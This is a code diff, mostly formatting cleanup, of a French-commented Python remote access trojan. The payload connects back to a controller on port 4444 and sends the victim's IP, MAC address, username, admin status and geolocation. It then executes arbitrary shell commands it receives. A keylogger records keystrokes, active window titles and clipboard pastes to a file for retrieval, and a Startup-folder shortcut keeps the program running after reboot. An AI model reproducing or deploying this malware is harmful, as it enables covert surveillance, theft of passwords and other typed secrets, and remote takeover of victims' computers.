@@ -13,15 +13,17 @@ import inspect
 import sys
 import time
 
-#pour la compil
+# pour la compil
 import imp
+
 
 def _async_raise(tid, exctype):
     """raises the exception, performs cleanup if needed"""
     tid = ctypes.c_long(tid)
     if not inspect.isclass(exctype):
         exctype = type(exctype)
-    res = ctypes.pythonapi.PyThreadState_SetAsyncExc(tid, ctypes.py_object(exctype))
+    res = ctypes.pythonapi.PyThreadState_SetAsyncExc(
+        tid, ctypes.py_object(exctype))
     if res == 0:
         raise ValueError("invalid thread id")
     elif res != 1:
@@ -30,24 +32,28 @@ def _async_raise(tid, exctype):
         ctypes.pythonapi.PyThreadState_SetAsyncExc(tid, None)
         raise SystemError("PyThreadState_SetAsyncExc failed")
 
+
 class Threads:
-    
+
     thread_id = 0
     thread_name = "null"
 
-    def StartThread(self, fonction, arg1 = ""):
+    def StartThread(self, fonction, arg1=""):
         if "Keylogger" in fonction:
             thread = threading.Thread(target=keylog.Keylog, name=fonction)
             thread.start()
         if "Commande" in fonction:
-            thread = threading.Thread(target=payload.Commande, name=fonction, args=arg1)
+            thread = threading.Thread(
+                target=payload.Commande, name=fonction, args=arg1)
             thread.start()
         self.thread_id = thread.ident
         self.thread_name = thread.name
-    
+
     def StopThread(self):
-        print("Arret du Thread : " + self.thread_name + ", numéro : " + str(self.thread_id))
+        print("Arret du Thread : " + self.thread_name +
+              ", numéro : " + str(self.thread_id))
         _async_raise(self.thread_id, SystemExit)
+
 
 class Payload:
 
@@ -55,14 +61,14 @@ class Payload:
     port = 4444
 
     SEPARATOR = "<sep>"
-    BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
+    BUFFER_SIZE = 1024 * 128  # 128KB max size of messages, feel free to increase
 
     keylogger_mode = "null"
 
     result_commande = ""
 
     def run(self):
-        
+
         while True:
             conn_ok = False
             ClientSocket = socket.socket()
@@ -80,8 +86,8 @@ class Payload:
             cwd = os.getcwd()
             ClientSocket.send(cwd.encode())
             inf = Info()
-            info = [inf.platform(), inf.public_ip(), inf.local_ip(), inf.mac_address(),\
-            inf.architecture(), inf.device(), inf.username(), inf.administrator(), inf.geolocation(), inf.ipv4(inf.local_ip())]
+            info = [inf.platform(), inf.public_ip(), inf.local_ip(), inf.mac_address(),
+                    inf.architecture(), inf.device(), inf.username(), inf.administrator(), inf.geolocation(), inf.ipv4(inf.local_ip())]
             message = f"{info[0]}{self.SEPARATOR}{info[1]}{self.SEPARATOR}{info[2]}{self.SEPARATOR}\
             {info[3]}{self.SEPARATOR}{info[4]}{self.SEPARATOR}{info[5]}{self.SEPARATOR}{info[6]}{self.SEPARATOR}\
             {info[7]}{self.SEPARATOR}{info[8]}{self.SEPARATOR}{info[9]}"
@@ -89,8 +95,7 @@ class Payload:
 
             pers = Persistance()
 
-            ### AJOUTER LE NUMERO DE SESSION DANS LES INFO
-
+            # AJOUTER LE NUMERO DE SESSION DANS LES INFO
 
             ##############
 
@@ -99,7 +104,8 @@ class Payload:
             while True:
                 # receive the command from the server
                 try:
-                    command = ClientSocket.recv(self.BUFFER_SIZE).decode('utf-8', "ignore")
+                    command = ClientSocket.recv(
+                        self.BUFFER_SIZE).decode('utf-8', "ignore")
                 except socket.error as e:
                     print(str(e))
                     break
@@ -107,17 +113,17 @@ class Payload:
                 splited_command = command.split()
                 print(command)
                 #output = subprocess.getoutput(command)
-                #ClientSocket.send(str.encode(output))
+                # ClientSocket.send(str.encode(output))
                 if command.lower() != "keylogger":
 
                     if splited_command[0].lower() == "keylogger":
 
                         if splited_command[1].lower() == "run" and self.keylogger_mode != "run":
-                            ## run le keylogger
+                            # run le keylogger
                             if self.keylogger_mode == "null":
                                 self.keylogger_mode = "run"
                                 output = "Keylogger Activé"
-                                ## lance un thread de keylog
+                                # lance un thread de keylog
                                 thread_keylog = Threads()
                                 thread_keylog.StartThread("Keylogger")
                             elif self.keylogger_mode == "stop":
@@ -127,7 +133,7 @@ class Payload:
                             output = "Keylogger déja Activé"
 
                         elif splited_command[1].lower() == "status":
-                            ## envoyer retour du keylogger
+                            # envoyer retour du keylogger
                             #self.keylogger_mode = "status"
                             file = open("keylogs.txt", 'r')
                             logs = file.read()
@@ -135,14 +141,14 @@ class Payload:
                             output = logs
 
                         elif splited_command[1].lower() == "stop":
-                            ## run le keylogger
+                            # run le keylogger
                             self.keylogger_mode = "stop"
-                            #thread_keylog.StopThread()
+                            # thread_keylog.StopThread()
                             output = "Keylogger Desactivé"
-                
+
                 else:
                     output = "Keylogger a besoin d'une option"
-                
+
                 if command.lower() != "persistance":
 
                     if splited_command[0].lower() == "persistance":
@@ -157,7 +163,8 @@ class Payload:
                                 print("Persistance via dossier startup déja activé")
                                 output = "Persistance via dossier startup déja activé"
                             if result == False and code == "error":
-                                print("Persistance via dossier startup a rencontrer une erreur")
+                                print(
+                                    "Persistance via dossier startup a rencontrer une erreur")
                                 output = "Persistance via dossier startup a rencontrer une erreur"
                             if result == True:
                                 print("Persistance via dossier startup activé")
@@ -169,7 +176,7 @@ class Payload:
 
                 else:
                     output = "Persistance a besoin d'une option"
-                
+
                 if command.lower() == "kill":
                     # si la commande est kill, ferme le programmes
                     os._exit(0)
@@ -193,15 +200,14 @@ class Payload:
                     """
 
                     output = self.Commande(command)
-                    
-                    
+
                     print("commande effectuer")
                     """"
                     resCmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,)
                     output, err = resCmd.communicate()
                     output = output.decode('cp850')
                     """
-                    
+
                 # get the current working directory as output
                 cwd = os.getcwd()
                 # send the results back to the server
@@ -209,24 +215,24 @@ class Payload:
                 ClientSocket.send(message.encode('utf-8'))
                 print("Resultat Envoyer")
 
-
                 #Input = input('Say Something: ')
-                #ClientSocket.send(str.encode(Input))
+                # ClientSocket.send(str.encode(Input))
                 #Response = ClientSocket.recv(1024)
-                #print(Response.decode('utf-8'))
-                
+                # print(Response.decode('utf-8'))
+
             ## Fin de Connection ##
 
             ClientSocket.close()
 
-    def LaunchThread(self, fonction, arg1 = ""):
+    def LaunchThread(self, fonction, arg1=""):
         print(fonction)
         t = Threads()
         t.StartThread(fonction, arg1)
         return t
 
-    def Commande(self,cmd):
-        resCmd = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stdin=subprocess.DEVNULL, stderr=subprocess.PIPE,)
+    def Commande(self, cmd):
+        resCmd = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
+                                  stdin=subprocess.DEVNULL, stderr=subprocess.PIPE,)
         output, err = resCmd.communicate()
         output = output.decode('cp850')
         payload.result_commande = output
@@ -241,54 +247,55 @@ class Keylogger:
     current_window = None
 
     def Keylog(self):
-            
-        #create and register a hook manager
+
+        # create and register a hook manager
         k1 = pyHook.HookManager()
         k1.KeyDown = self.Keystroke
-        #register the hook and execute forever
+        # register the hook and execute forever
         k1.HookKeyboard()
         pythoncom.PumpMessages()
         print("Fin du keylogger")
 
-
         ## Fonction keylloger ##
 
     def get_current_process(self):
-        #Get a handle to the foreground window
+        # Get a handle to the foreground window
         hwnd = self.user32.GetForegroundWindow()
-        print("hwnd",hwnd)
-        #Find Process id
+        print("hwnd", hwnd)
+        # Find Process id
         pid = c_ulong()
-        print("pid",pid)
-        self.user32.GetWindowThreadProcessId(hwnd ,byref(pid))
-        #store the current process ID
+        print("pid", pid)
+        self.user32.GetWindowThreadProcessId(hwnd, byref(pid))
+        # store the current process ID
         process_id = pid.value
-        print("processid",process_id)
-        #grab the executable
-        executable = create_string_buffer (b'\x00',512)
-        h_process = self.kernel32.OpenProcess(0x400 | 0x10 ,False ,pid)
-        self.psapi.GetModuleBaseNameA(h_process ,None ,byref(executable) ,512)
-        #now read its title
-        window_title = create_string_buffer(b"\x00",512)
-        print(window_title , executable ,process_id ,hwnd)
-        length = self.user32.GetWindowTextA(hwnd ,byref(window_title) ,512)
+        print("processid", process_id)
+        # grab the executable
+        executable = create_string_buffer(b'\x00', 512)
+        h_process = self.kernel32.OpenProcess(0x400 | 0x10, False, pid)
+        self.psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)
+        # now read its title
+        window_title = create_string_buffer(b"\x00", 512)
+        print(window_title, executable, process_id, hwnd)
+        length = self.user32.GetWindowTextA(hwnd, byref(window_title), 512)
 
         # w = win32gui
         # z=w.GetWindowText(w.GetForegroundWindow())
-        #print out the header if we're in the right process
+        # print out the header if we're in the right process
         print()
-        print("PID : %s - %s - %s"%(process_id,executable.value ,window_title.value))
-        var = "PID : %s - %s - %s"%(process_id,executable.value ,window_title.value)
+        print("PID : %s - %s - %s" %
+              (process_id, executable.value, window_title.value))
+        var = "PID : %s - %s - %s" % (process_id,
+                                      executable.value, window_title.value)
         file = open("keylogs.txt", 'a')
-        file.write("\n%s\n"%var)
+        file.write("\n%s\n" % var)
         file.close()
         print()
-        #close handles
+        # close handles
         self.kernel32.CloseHandle(hwnd)
         self.kernel32.CloseHandle(h_process)
 
-    def Keystroke(self, event ):
-        ##Couper le keylogger
+    def Keystroke(self, event):
+        # Couper le keylogger
         if payload.keylogger_mode == "stop":
             """
             pid = os.getpid()
@@ -297,37 +304,38 @@ class Keylogger:
             output = output.decode('cp850')
             print(output)
             """
-            #ctypes.windll.self.user32.PostQuitMessage(0)
+            # ctypes.windll.self.user32.PostQuitMessage(0)
             return True
-            #exit()
-        #check to see if target changed windows
-        if event.WindowName != self.current_window :
+            # exit()
+        # check to see if target changed windows
+        if event.WindowName != self.current_window:
             self.current_window = event.WindowName
             self.get_current_process()
-        #if they pressed a standard key
-        if event.Ascii in range(32 ,128) :
+        # if they pressed a standard key
+        if event.Ascii in range(32, 128):
             print(chr(event.Ascii))
             h = chr(event.Ascii)
             file = open("keylogs.txt", 'a')
-            file.write("%s"%h)
+            file.write("%s" % h)
             file.close()
-        else :
-            #if [CTRL-V] ,get the value on the clipboard
+        else:
+            # if [CTRL-V] ,get the value on the clipboard
             if event.Key == "V":
                 win32clipboard.OpenClipboard()
                 pasted_value = win32clipboard.GetClipboardData()
                 win32clipboard.CloseClipboard()
                 print("[PASTE] - {0}".format(pasted_value))
-                file =open("keylogs.txt" ,'a')
+                file = open("keylogs.txt", 'a')
                 file.write("\n[PASTE] - {0}\n".format(pasted_value))
                 file.close()
-            else :
+            else:
                 print("{0}".format(event.Key))
                 file = open("keylogs.txt", 'a')
                 file.write("{0}".format(event.Key))
                 file.close()
-        #pass execution to next hook registered
+        # pass execution to next hook registered
         return True
+
 
 class Persistance:
 
@@ -337,10 +345,12 @@ class Persistance:
                 value = sys.argv[0]
                 if value and os.path.isfile(value):
                     appdata = os.path.expandvars("%AppData%")
-                    startup_dir = os.path.join(appdata, r'Microsoft\Windows\Start Menu\Programs\Startup')
+                    startup_dir = os.path.join(
+                        appdata, r'Microsoft\Windows\Start Menu\Programs\Startup')
                     if not os.path.exists(startup_dir):
                         os.makedirs(startup_dir)
-                    startup_file = os.path.join(startup_dir, '%s.eu.url' % name)
+                    startup_file = os.path.join(
+                        startup_dir, '%s.eu.url' % name)
                     content = '\n[InternetShortcut]\nURL=file:///%s\n' % value
                     if not os.path.exists(startup_file) or content != open(startup_file, 'r').read():
                         with open(startup_file, 'w') as fp:
@@ -375,7 +385,6 @@ class Info:
             from urllib import urlopen
         return urlopen('http://api.ipify.org').read()
 
-
     def local_ip(self):
         """
         Return local IP address of host machine
@@ -383,14 +392,12 @@ class Info:
         import socket
         return socket.gethostbyname(socket.gethostname())
 
-
     def mac_address(self):
         """
         Return MAC address of host machine
         """
         import uuid
-        return ':'.join(hex(uuid.getnode()).strip('0x').strip('L')[i:i+2] for i in range(0,11,2)).upper()
-
+        return ':'.join(hex(uuid.getnode()).strip('0x').strip('L')[i:i+2] for i in range(0, 11, 2)).upper()
 
     def architecture(self):
         """
@@ -399,14 +406,12 @@ class Info:
         import struct
         return int(struct.calcsize('P') * 8)
 
-
     def device(self):
         """
         Return the name of the host machine
         """
         import socket
         return socket.getfqdn(socket.gethostname())
-
 
     def username(self):
         """
@@ -415,7 +420,6 @@ class Info:
         import os
         return os.getenv('USER', os.getenv('USERNAME', 'user'))
 
-
     def administrator(self):
         """
         Return True if current user is administrator, otherwise False
@@ -423,7 +427,6 @@ class Info:
         import os
         import ctypes
         return bool(ctypes.windll.shell32.IsUserAnAdmin() if os.name == 'nt' else os.getuid() == 0)
-
 
     def geolocation(self):
         """
@@ -439,7 +442,6 @@ class Info:
         json_data = json.loads(response)
         latitude, longitude = json_data.get('loc').split(',')
         return (latitude, longitude)
-
 
     def ipv4(self, address):
         """
